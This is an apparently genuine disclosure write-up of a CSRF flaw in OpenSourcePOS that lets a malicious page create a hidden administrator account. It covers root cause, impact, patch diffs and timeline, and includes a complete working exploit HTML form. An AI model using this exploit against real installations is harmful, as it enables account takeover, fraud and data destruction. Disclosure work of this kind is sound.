# CVE-2025-68434: CSRF Unauthorized Administrator Creation in OpenSourcePOS

| Metadata | Details |
| --- | --- |
| **CVE ID** | **[CVE-2025-68434](https://cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2025-68434)** |
| **Severity** | **Critical (8.8)** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| **Vulnerability Type** | Cross-Site Request Forgery (CWE-352) |
| **Affected Versions** | OpenSourcePOS v3.4.0, v3.4.1 |
| **Patched Version** | **v3.4.2** |
| **Vulnerable Component** | `app/Config/Filters.php` (Global Security Filters) |
| **Reporter** | [Aditya Singh (Nixon-H)](https://github.com/Nixon-H) |

---

## 📝 Executive Summary

A **Critical Cross-Site Request Forgery (CSRF)** vulnerability was discovered in the core security configuration of OpenSourcePOS. The application's global CSRF protection mechanism was explicitly disabled within the `app/Config/Filters.php` file due to a temporary development "TODO" that was never resolved.

This misconfiguration allowed the application to accept state-changing HTTP requests (POST) without verifying a valid anti-forgery token. An unauthenticated, remote attacker could exploit this by tricking a logged-in Administrator into visiting a malicious page. The attacker's page would then silently force the victim's browser to execute administrative actions; specifically, creating a new "Backdoor" Administrator account with full privileges; leading to a complete system takeover.

---

## 🕵️‍♂️ Technical Root Cause Analysis

### The Vulnerable Configuration

The vulnerability was located in the **Global Filters** configuration (`app/Config/Filters.php`). In CodeIgniter 4, the `$globals` array determines which filters run on *every* request.

In the affected versions, the `csrf` filter was commented out in the `before` execution list, effectively disabling CSRF protection for the entire application.

**Vulnerable Code (app/Config/Filters.php):**

```php
public array $globals = [
    'before' => [
        'honeypot',
        // 'csrf' => ['except' => 'login'],    // TODO: Temporarily disable CSRF until we get everything sorted
        'invalidchars',
    ],
    // ...
];

```

Because this line was commented out, the middleware responsible for checking `csrf_token_name` never executed. The application accepted any POST request from any origin, relying solely on the session cookie (`ospos_session`) for authentication.

---

## 💥 Proof of Concept (PoC)

### Attack Scenario

1. **Attacker:** Hosts the `csrf_exploit.html` file on an external server.
2. **Victim:** A logged-in OpenSourcePOS Administrator (active session).
3. **Trigger:** The victim is tricked into clicking a link to the attacker's site.
4. **Execution:** The malicious page loads, generates a random unique username (to avoid conflicts), and auto-submits a hidden form to the victim's local OpenSourcePOS instance.
5. **Result:** A new Admin account (e.g., `valid_12345`) is created instantly.

### Exploit Code (`POC/csrf_exploit.html`)

This is the exact payload used to create a rogue Administrator with full permissions:

```html
<!DOCTYPE html>
<html>
<head>
    <title>OSPOS CSRF Exploit (Verified)</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        .status { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <h2>OSPOS Privilege Escalation Exploit</h2>
    <p>Creating Administrator account...</p>
    <p id="msg" class="status">Initializing payload...</p>

    <form action="http://localhost/index.php/employees/save/-1" method="POST" id="hackForm">

        <input type="hidden" name="first_name" value="Valid">
        <input type="hidden" name="last_name" value="User">
        <input type="hidden" name="username" id="username" value="">
        <input type="hidden" name="email" id="email" value="">
        
        <input type="hidden" name="phone_number" value=""> 
        <input type="hidden" name="password" value="Password123!">
        <input type="hidden" name="repeat_password" value="Password123!">
        <input type="hidden" name="gender" value="1">
        <input type="hidden" name="language" value=":">
        
        <input type="hidden" name="address_1" value="">
        <input type="hidden" name="address_2" value="">
        <input type="hidden" name="city" value="">
        <input type="hidden" name="state" value="">
        <input type="hidden" name="zip" value="">
        <input type="hidden" name="country" value="">
        <input type="hidden" name="comments" value="CSRF_PoC_Successful">

        <input type="hidden" name="grant_home" value="home"> <input type="hidden" name="menu_group_home" value="both">
        <input type="hidden" name="grant_customers" value="customers"> <input type="hidden" name="menu_group_customers" value="both">
        <input type="hidden" name="grant_items" value="items"> <input type="hidden" name="menu_group_items" value="both">
        <input type="hidden" name="grant_item_kits" value="item_kits"> <input type="hidden" name="menu_group_item_kits" value="both">
        <input type="hidden" name="grant_suppliers" value="suppliers"> <input type="hidden" name="menu_group_suppliers" value="both">
        <input type="hidden" name="grant_reports" value="reports"> <input type="hidden" name="menu_group_reports" value="both">
        <input type="hidden" name="grant_receivings" value="receivings"> <input type="hidden" name="menu_group_receivings" value="both">
        <input type="hidden" name="grant_sales" value="sales"> <input type="hidden" name="menu_group_sales" value="both">
        <input type="hidden" name="grant_employees" value="employees"> <input type="hidden" name="menu_group_employees" value="both">
        <input type="hidden" name="grant_giftcards" value="giftcards"> <input type="hidden" name="menu_group_giftcards" value="both">
        <input type="hidden" name="grant_messages" value="messages"> <input type="hidden" name="menu_group_messages" value="both">
        <input type="hidden" name="grant_taxes" value="taxes"> <input type="hidden" name="menu_group_taxes" value="both">
        <input type="hidden" name="grant_attributes" value="attributes"> <input type="hidden" name="menu_group_attributes" value="both">
        <input type="hidden" name="grant_expenses" value="expenses"> <input type="hidden" name="menu_group_expenses" value="both">
        <input type="hidden" name="grant_expenses_categories" value="expenses_categories"> <input type="hidden" name="menu_group_expenses_categories" value="both">
        <input type="hidden" name="grant_cashups" value="cashups"> <input type="hidden" name="menu_group_cashups" value="both">
        <input type="hidden" name="grant_config" value="config"> <input type="hidden" name="menu_group_config" value="home">
        <input type="hidden" name="grant_office" value="office"> <input type="hidden" name="menu_group_office" value="both">

        <input type="hidden" name="grant_items_stock" value="items_stock"> <input type="hidden" name="menu_group_items_stock" value="--">
        <input type="hidden" name="grant_sales_stock" value="sales_stock"> <input type="hidden" name="menu_group_sales_stock" value="--">
        <input type="hidden" name="grant_receivings_stock" value="receivings_stock"> <input type="hidden" name="menu_group_receivings_stock" value="--">
        <input type="hidden" name="grant_sales_change_price" value="sales_change_price"> <input type="hidden" name="menu_group_sales_change_price" value="--">
        <input type="hidden" name="grant_sales_delete" value="sales_delete"> <input type="hidden" name="menu_group_sales_delete" value="--">
        
        <input type="hidden" name="grant_reports_categories" value="reports_categories"> <input type="hidden" name="menu_group_reports_categories" value="--">
        <input type="hidden" name="grant_reports_customers" value="reports_customers"> <input type="hidden" name="menu_group_reports_customers" value="--">
        <input type="hidden" name="grant_reports_discounts" value="reports_discounts"> <input type="hidden" name="menu_group_reports_discounts" value="--">
        <input type="hidden" name="grant_reports_employees" value="reports_employees"> <input type="hidden" name="menu_group_reports_employees" value="--">
        <input type="hidden" name="grant_reports_expenses_categories" value="reports_expenses_categories"> <input type="hidden" name="menu_group_reports_expenses_categories" value="--">
        <input type="hidden" name="grant_reports_inventory" value="reports_inventory"> <input type="hidden" name="menu_group_reports_inventory" value="--">
        <input type="hidden" name="grant_reports_items" value="reports_items"> <input type="hidden" name="menu_group_reports_items" value="--">
        <input type="hidden" name="grant_reports_payments" value="reports_payments"> <input type="hidden" name="menu_group_reports_payments" value="--">
        <input type="hidden" name="grant_reports_receivings" value="reports_receivings"> <input type="hidden" name="menu_group_reports_receivings" value="--">
        <input type="hidden" name="grant_reports_sales" value="reports_sales"> <input type="hidden" name="menu_group_reports_sales" value="--">
        <input type="hidden" name="grant_reports_sales_taxes" value="reports_sales_taxes"> <input type="hidden" name="menu_group_reports_sales_taxes" value="--">
        <input type="hidden" name="grant_reports_suppliers" value="reports_suppliers"> <input type="hidden" name="menu_group_reports_suppliers" value="--">
        <input type="hidden" name="grant_reports_taxes" value="reports_taxes"> <input type="hidden" name="menu_group_reports_taxes" value="--">

        <input type="hidden" name="honeypot" value="">

        <script>
            // 1. Generate unique ID to ensure valid creation
            var id = Math.floor(Math.random() * 99999);
            var user = "valid_" + id;
            
            // 2. Inject into form
            document.getElementById('username').value = user;
            document.getElementById('email').value = user + "@test.com";
            
            document.getElementById('msg').innerText = "Attacking with user: " + user;

            // 3. Auto-submit
            setTimeout(function() {
                document.getElementById('hackForm').submit();
            }, 1000);
        </script>
    </form>
</body>
</html>

```

### 📷 Media Proof

*(Images and Exploit Files are located in the `POC/` directory)*

**Screenshot 1: [The Exploit Execution](https://github.com/Nixon-H/OpenSourcePOS-CSRF-Account-Takeover/blob/main/POC/Exploit_Execution.png)**

**Screenshot 2: [The Rogue Account Created](https://github.com/Nixon-H/OpenSourcePOS-CSRF-Account-Takeover/blob/main/POC/Rogue_Account_Created.png)**

**🎥 Video Demonstration:**
[Click to Watch / Download the PoC Video](https://github.com/Nixon-H/OpenSourcePOS-CSRF-Account-Takeover/blob/main/POC/CSRF_ADMIN_TAKEOVER_POC.mkv)

---

## ⚠️ Impact Scenarios

### 1. Shadow Admin Persistence (The "Backdoor")

The created account is not just a temporary session; it is a permanent database entry.

* **Impact:** Even if the real admin logs out, the attacker retains access indefinitely.
* **Stealth:** The attacker can name the user "System_Updater" or "Support_Account" to blend in with legitimate users, allowing them to siphon data for months undetected.

### 2. Supply Chain Sabotage (Chaining with XSS)

Using the `grant_config` permission, the attacker can modify the **Store Configuration**.

* **Attack:** The attacker uses CSRF to inject a malicious JavaScript payload into the "Return Policy" field (exploiting **CVE-2025-68147**).
* **Impact:** This turns the POS system into a watering hole. Every employee or customer who views a receipt gets infected with malware or has their session hijacked.

### 3. Financial Fraud & Denial of Service

* **Fraud:** Attacker creates "Gift Cards" worth thousands of dollars and emails the codes to themselves.
* **DoS:** Attacker triggers a mass-delete action (`/items/delete`), wiping the entire product inventory database and halting business operations.

---

## 🛡️ Remediation

The vulnerability was fixed in **OpenSourcePOS v3.4.2**. The fix required a multi-step architectural change to handle race conditions in the application's AJAX-heavy sales interface.

### 1. Re-enabling the Filter

In `app/Config/Filters.php`, the global CSRF filter was uncommented.

```diff
     'before' => [
         'honeypot',
-        // 'csrf' => ['except' => 'login'],    // TODO: Temporarily disable CSRF until we get everything sorted
+        'csrf' => ['except' => 'login'],
         'invalidchars',
     ],

```

### 2. Changing Security Storage Strategy

In `app/Config/Security.php`, the developers switched from cookie-based to session-based tokens and disabled token regeneration to prevent issues with parallel AJAX requests (e.g., in the Sales module).

```diff
-   public string $csrfProtection = 'cookie';
+   public string $csrfProtection = 'session';

-   public bool $regenerate = true;
+   public bool $regenerate = false;

```

### 3. Frontend Token Handling

The `app/Views/partial/header_js.php` file was updated to inject the token hash directly from the server rather than reading it from a client-side cookie, improving security posture.

```diff
-   var csrf_token = function() {
-       return Cookies.get(cookie_name);
-   };
+   var csrf_token = function() {
+       return "<?= csrf_hash() ?>";
+   };

```

---

## 📅 Disclosure Timeline

* **2025-12-12:** Vulnerability discovered by **Aditya Singh (Nixon-H)** during a manual security audit.
* **2025-12-13:** Responsible disclosure report sent to maintainer (**Jeroen Peelaerts**) via GitHub/Email.
* **2025-12-14:** Vulnerability confirmed by maintainer.
* **2025-12-16:** Patch developed (Commit `d575c8d`) and verified by researcher.
* **2025-12-19:** Patch released in version **3.4.2**.
* **2025-12-19:** Public disclosure via GitHub Security Advisory.

---

### 🔗 References

* **Advisory:** [GHSA-wjm4-hfwg-5w5r](https://github.com/opensourcepos/opensourcepos/security/advisories/GHSA-wjm4-hfwg-5w5r)
* **Patch:** [Commit d575c8d](https://github.com/opensourcepos/opensourcepos/commit/d575c8da9a1d7af8313a1e758e000e243f5614ef)
* **Reporter:** [Aditya Singh (Nixon-H)](https://github.com/Nixon-H)
